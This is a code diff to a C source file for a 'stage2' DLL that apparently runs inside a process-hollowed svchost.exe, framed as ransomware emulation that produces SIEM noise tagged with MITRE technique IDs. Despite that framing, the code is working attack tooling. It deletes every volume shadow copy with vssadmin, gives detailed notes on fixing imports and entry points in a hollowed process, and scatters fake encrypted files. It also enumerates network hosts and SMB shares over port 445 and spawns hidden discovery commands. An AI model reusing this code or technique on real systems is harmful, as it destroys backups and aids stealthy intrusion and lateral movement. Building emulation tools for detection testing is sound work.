@@ -60,6 +60,28 @@ static BOOL SpawnHiddenWait(LPCWSTR cmd, DWORD timeoutMs) {
     return FALSE;
 }
 
+// ponytail: hollowed svchost at CREATE_SUSPENDED only has ntdll/kernel32/
+// kernelbase/advapi32 mapped. The other IAT deps (msvcrt, netapi32, shell32,
+// user32, winhttp, ws2_32) are NOT mapped, so the IAT entries written by
+// loader.c point to unmapped memory and the first non-kernel call faults.
+// System-wide ASLR means once LoadLibraryW maps a DLL into svchost it lands at
+// the SAME base loader resolved, so the already-written IAT entries become
+// valid retroactively. LoadLibraryW is itself a kernel32 import (mapped),
+// so this call works. CreateRemoteThread is dead on Win11 24H2/Tiny11
+// (err 998 on un-init'd suspended children), hence self-load instead of
+// remote-thread injection. Ceiling: a per-process (non-ASLR) dep would still
+// break this — would need true remote import resolution. All stage2 deps are
+// system DLLs with ASLR.
+static void LoadDeps(void) {
+    static const wchar_t* deps[] = {
+        L"advapi32.dll", L"kernel32.dll", L"msvcrt.dll", L"netapi32.dll",
+        L"shell32.dll",  L"user32.dll",  L"winhttp.dll", L"ws2_32.dll"
+    };
+    for (int i = 0; i < sizeof(deps)/sizeof(deps[0]); i++) {
+        LoadLibraryW(deps[i]);
+    }
+}
+
 static void DoVssadmin(void) {
     LogMessage(L"[*] T1490: Deleting volume shadow copies");
     SpawnHiddenWait(L"vssadmin.exe delete shadows /all /quiet", 30000);
@@ -151,20 +173,40 @@ HCRYPTPROV hProv = 0;
 
     if (encrypted == 0) {
         LogMessage(L"[+] T1486: No user documents found — writing synthetic .govinda");
-        wchar_t desktop[MAX_PATH];
-        if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
-            wchar_t synthPath[MAX_PATH];
-            wsprintfW(synthPath, L"%s\\test.govinda", desktop);
-            HANDLE hFile = CreateFileW(synthPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            if (hFile != INVALID_HANDLE_VALUE) {
-                char synth[] = "synthetic .govinda file (no user documents found)";
-                DWORD written = 0;
-                WriteFile(hFile, synth, lstrlenA(synth), &written, NULL);
-                CloseHandle(hFile);
-                wchar_t synthLog[MAX_PATH*2];
-                wsprintfW(synthLog, L"[+] T1486: encrypted -> %s", synthPath);
-                LogMessage(synthLog);
+        // ponytail: 6-file synthetic scatter instead of 1 desktop drop. LCG seed
+        // ceiling: period 2^32 fine for <=6 draws; upgrade to CryptGenRandom if count rises.
+        DWORD seed = GetTickCount();
+        for (int i = 0; i < 6; i++) {
+            seed = seed * 1664525u + 1013904223u;
+            wchar_t base[MAX_PATH];
+            BOOL gotBase = FALSE;
+            switch (i) {
+                case 0: gotBase = (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, base) == S_OK); break;
+                case 1: gotBase = (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, base) == S_OK); if (gotBase) lstrcatW(base, L"\\Documents"); break;
+                case 2: gotBase = (SHGetFolderPathW(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, base) == S_OK); break;
+                case 3: gotBase = (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, base) == S_OK); if (gotBase) lstrcatW(base, L"\\Pictures"); break;
+                case 4: lstrcpyW(base, L"C:\\ProgramData\\Microsoft\\Diagnosis"); gotBase = TRUE; break;
+                case 5: lstrcpyW(base, L"C:\\Windows\\Temp"); gotBase = TRUE; break;
             }
+            if (!gotBase) continue;
+            DWORD attr = GetFileAttributesW(base);
+            if (attr == INVALID_FILE_ATTRIBUTES) {
+                if (!CreateDirectoryW(base, NULL)) continue;
+            } else if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+                continue;
+            }
+            wchar_t synthPath[MAX_PATH];
+            wsprintfW(synthPath, L"%s\\govinda_%lu.govinda", base, seed % 100000u);
+            HANDLE hFile = CreateFileW(synthPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) continue;
+            char synth[] = "synthetic encrypted content (T1486 simulation)";
+            DWORD written = 0;
+            WriteFile(hFile, synth, lstrlenA(synth), &written, NULL);
+            CloseHandle(hFile);
+            encrypted++;
+            wchar_t synthLog[MAX_PATH*2];
+            wsprintfW(synthLog, L"[+] T1486: encrypted -> %s", synthPath);
+            LogMessage(synthLog);
         }
     }
 
@@ -236,50 +278,50 @@ static void DoLateralRecon(void) {
     int hostsFound = 0, portsOpen = 0, sharesFound = 0;
 
     if (status == NERR_Success && pServers) {
-        PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
-        for (DWORD i = 0; i < dwEntries; i++) {
-            hostsFound++;
-            char line[512];
-            snprintf(line, sizeof(line), "Host: %S", pInfo[i].sv100_name);
-            AppendToFile(NET_PATH, line);
-
-            char nameA[256];
-            snprintf(nameA, sizeof(nameA), "%S", pInfo[i].sv100_name);
-            struct hostent* host = gethostbyname(nameA);
-            if (host && host->h_addr_list[0]) {
-                struct in_addr addr;
-                memcpy(&addr, host->h_addr_list[0], sizeof(addr));
-                snprintf(line, sizeof(line), "  IP: %s", inet_ntoa(addr));
+PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
+            for (DWORD i = 0; i < dwEntries; i++) {
+                hostsFound++;
+                char line[512];
+                wsprintfA(line, "Host: %S", pInfo[i].sv100_name);
                 AppendToFile(NET_PATH, line);
 
-                SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-                if (sock != INVALID_SOCKET) {
-                    DWORD timeout = 3000;
-                    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
-                    struct sockaddr_in sa;
-                    sa.sin_family = AF_INET; sa.sin_port = htons(445);
-                    sa.sin_addr = addr;
-                    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
-                        portsOpen++;
-                        AppendToFile(NET_PATH, "  Port 445: OPEN");
-                        wchar_t uncPath[512];
-                        wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
-                        LPBYTE pShares = NULL;
-                        DWORD shEntries = 0, shTotal = 0;
-                        if (NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &shEntries, &shTotal, NULL) == NERR_Success && pShares) {
-                            PSHARE_INFO_1 si = (PSHARE_INFO_1)pShares;
-                            for (DWORD j = 0; j < shEntries; j++) {
-                                sharesFound++;
-                                snprintf(line, sizeof(line), "    Share: %S (type: %lu)", si[j].shi1_netname, si[j].shi1_type);
-                                AppendToFile(NET_PATH, line);
+                char nameA[256];
+                wsprintfA(nameA, "%S", pInfo[i].sv100_name);
+                struct hostent* host = gethostbyname(nameA);
+                if (host && host->h_addr_list[0]) {
+                    struct in_addr addr;
+                    memcpy(&addr, host->h_addr_list[0], sizeof(addr));
+                    wsprintfA(line, "  IP: %s", inet_ntoa(addr));
+                    AppendToFile(NET_PATH, line);
+
+                    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+                    if (sock != INVALID_SOCKET) {
+                        DWORD timeout = 3000;
+                        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+                        struct sockaddr_in sa;
+                        sa.sin_family = AF_INET; sa.sin_port = htons(445);
+                        sa.sin_addr = addr;
+                        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
+                            portsOpen++;
+                            AppendToFile(NET_PATH, "  Port 445: OPEN");
+                            wchar_t uncPath[512];
+                            wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
+                            LPBYTE pShares = NULL;
+                            DWORD shEntries = 0, shTotal = 0;
+                            if (NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &shEntries, &shTotal, NULL) == NERR_Success && pShares) {
+                                PSHARE_INFO_1 si = (PSHARE_INFO_1)pShares;
+                                for (DWORD j = 0; j < shEntries; j++) {
+                                    sharesFound++;
+                                    wsprintfA(line, "    Share: %S (type: %lu)", si[j].shi1_netname, si[j].shi1_type);
+                                    AppendToFile(NET_PATH, line);
+                                }
+                                NetApiBufferFree(pShares);
                             }
-                            NetApiBufferFree(pShares);
                         }
+                        closesocket(sock);
                     }
-                    closesocket(sock);
                 }
             }
-        }
         NetApiBufferFree(pServers);
     }
 
@@ -314,38 +356,23 @@ static void DoLateralRecon(void) {
 // Generates Security 4798 (user group membership enumerated) when
 // "Audit User/Group Management" is enabled, even on non-domain hosts.
 static void DoUserEnumNoise(void) {
-    LogMessage(L"[*] T1087: Account discovery (NetUserEnum/NetLocalGroupEnum)");
-    LPBYTE pUsers = NULL;
-    DWORD dwEntries = 0, dwTotal = 0;
-    if (NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, &pUsers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, NULL) == NERR_Success) {
-        wchar_t buf[256];
-        wsprintfW(buf, L"[+] T1087: NetUserEnum: %lu local users", dwEntries);
-        LogMessage(buf);
-        if (pUsers) NetApiBufferFree(pUsers);
-    } else {
-        LogMessage(L"[+] T1087: NetUserEnum unavailable (synthetic)");
-    }
-    LPBYTE pGroups = NULL;
-    DWORD gEntries = 0, gTotal = 0;
-    if (NetLocalGroupEnum(NULL, 0, &pGroups, MAX_PREFERRED_LENGTH, &gEntries, &gTotal, NULL) == NERR_Success) {
-        wchar_t buf[256];
-        wsprintfW(buf, L"[+] T1087: NetLocalGroupEnum: %lu local groups", gEntries);
-        LogMessage(buf);
-        if (pGroups) NetApiBufferFree(pGroups);
-    } else {
-        LogMessage(L"[+] T1087: NetLocalGroupEnum unavailable (synthetic)");
-    }
+    LogMessage(L"[*] T1087: Account discovery (net/whoami subprocess noise)");
+    // ponytail: subprocess spawns for real 4688 events over NetAPI calls
+    SpawnHiddenWait(L"net.exe user", 10000);
+    LogMessage(L"[+] T1087: net.exe user: spawned");
+    SpawnHiddenWait(L"net.exe localgroup", 10000);
+    LogMessage(L"[+] T1087: net.exe localgroup: spawned");
+    SpawnHiddenWait(L"whoami.exe /user /groups /priv", 10000);
+    LogMessage(L"[+] T1087: whoami.exe /user /groups /priv: spawned");
 }
 
-// T1082 System Info Discovery — wmic subprocess noise
-// Generates 4688 (process creation) for wmic.exe + WMI-Activity trace events.
+// T1082 System Info Discovery — systeminfo.exe subprocess noise
+// Generates 4688 (process creation) for systeminfo.exe.
 static void DoWMIGather(void) {
-    LogMessage(L"[*] T1082: System info discovery via WMI (SIEM noise)");
-    SpawnHiddenWait(L"wmic.exe qfe list", 10000);
-    SpawnHiddenWait(L"wmic.exe startup list brief", 10000);
-    SpawnHiddenWait(L"wmic.exe service list brief", 10000);
-    SpawnHiddenWait(L"wmic.exe os get Caption,BuildNumber,OSArchitecture", 10000);
-    LogMessage(L"[+] T1082: WMI queries executed");
+    // ponytail: dropped wmic.exe — optional/deprecated on Win11 24H2, systeminfo.exe covers OS/build/arch/QFE/services in one spawn
+    LogMessage(L"[*] T1082: System info discovery via systeminfo.exe (SIEM noise)");
+    SpawnHiddenWait(L"systeminfo.exe", 20000);
+    LogMessage(L"[+] T1082: systeminfo.exe executed");
 }
 
 // T1053.005 Scheduled Task — create + query + delete cycle
@@ -376,6 +403,11 @@ static void DoEventLogNoise(void) {
 // System.Drawing.dll, gdiplus.dll, System.Windows.Forms.dll.
 static void DoScreenCaptureNoise(void) {
     LogMessage(L"[*] T1113: Screen capture attempt (SIEM noise)");
+    // ponytail: Win11 24H2+ SnippingTool.exe absent on older OS, log either way
+    if (SpawnHiddenWait(L"SnippingTool.exe", 10000))
+        LogMessage(L"[+] T1113: SnippingTool.exe spawned (Win11)");
+    else
+        LogMessage(L"[+] T1113: SnippingTool.exe unavailable (older Windows)");
     SpawnHiddenWait(L"powershell.exe -NoP -c \"Add-Type -AssemblyName System.Drawing\"", 10000);
     LogMessage(L"[+] T1113: screen capture assembly loaded");
 }
@@ -387,9 +419,23 @@ static void DoCleanup(void) {
     LogMessage(L"[+] T1070.004: Staging files cleaned");
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+// ponytail: exported as DllEntry (NOT DllMain) because MinGW's ld special-cases
+// "DllMain": even with __declspec(dllexport) it may be dropped from the export
+// table. loader.c resolves this export's RVA from stage2's export table and
+// redirects the hollowed thread's Rip straight here, skipping
+// _DllMainCRTStartup. That CRT wrapper does init (TLS callbacks, security
+// cookie, RtlAddFunctionTable registration) that never runs in a hand-hollowed
+// process — the OS loader isn't involved — so the wrapper faults silently and
+// stage2 produced zero artifacts (the bug we hit: every log:T* probe failed
+// with no "Stage2 started" line). Calling DllEntry directly is safe because
+// stage2 uses only Win32 APIs (kernel32/user32/netapi32/winhttp/ws2_32/
+// crypt32/shell32) — no CRT state, no exceptions. Ceiling: if a future stage2
+// ever pulls in CRT (malloc/stdio/throw), re-introduce a CRT-safe entry or run
+// _CRT_INIT once before DllEntry.
+__declspec(dllexport) BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hinstDLL);
+        LoadDeps();
         LogMessage(L"[*] Stage2 started (inside hollowed svchost.exe)");
         DoVssadmin();
         DoEncryptFiles();
